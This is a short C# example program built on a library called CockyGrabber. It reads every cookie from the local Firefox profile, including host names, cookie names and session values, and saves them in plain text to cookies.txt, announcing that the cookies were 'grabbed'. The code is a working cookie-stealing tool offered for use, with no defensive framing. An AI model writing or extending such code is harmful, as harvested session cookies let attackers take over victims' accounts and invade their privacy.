using CockyGrabber;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GrabberExamples
{
    class Program
    {
        static void Main(string[] args)
        {
            StringBuilder firefoxCookies = new StringBuilder();

            FirefoxGrabber fg = new FirefoxGrabber();
            if (fg.CookiesExists())
            {
                foreach (var item in fg.GetAllCookies())
                {
                    firefoxCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }

            }

            File.WriteAllText("cookies.txt", firefoxCookies.ToString());
            Console.WriteLine("Cookies Grabbed and saved Successfully!");
            Console.ReadKey();
        }
    }
}
